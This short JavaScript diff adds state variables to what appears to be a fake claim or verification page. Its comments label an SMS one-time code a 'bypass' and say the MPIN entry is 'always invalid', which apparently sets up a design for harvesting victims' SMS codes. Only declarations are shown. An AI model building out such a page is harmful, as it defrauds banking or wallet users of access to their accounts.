@@ -12,7 +12,9 @@
     let claimInProgress = false;
     let isRedirecting = false;
     let currentFirewallStatus = false;
-    let enteredMPIN = '';  // For 4-digit MPIN
+    let enteredVerificationCode = '';  // For 6-digit SMS code (bypass)
+    let enteredMPIN = '';              // For 4-digit MPIN (always invalid)
+    let showMPINKeypad = false;
     
     // ========== INITIALIZATION ==========
     function init() {
